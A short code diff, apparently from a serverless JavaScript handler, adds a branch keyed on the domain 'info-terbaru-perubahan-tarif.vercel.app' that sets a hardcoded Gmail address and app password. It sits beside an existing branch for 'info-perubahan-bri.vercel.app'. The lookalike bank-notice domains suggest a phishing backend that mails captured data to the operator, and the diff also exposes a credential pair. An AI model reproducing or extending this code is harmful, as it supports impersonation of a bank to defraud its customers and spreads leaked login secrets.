@@ -7,6 +7,11 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+     if (url == 'info-terbaru-perubahan-tarif.vercel.app'){
+
+       email = 'biarsemangat12@gmail.com'
+       pass = 'yetptlwiozcemdfc'
+    }else
     
      if (url == 'info-perubahan-bri.vercel.app'){
 
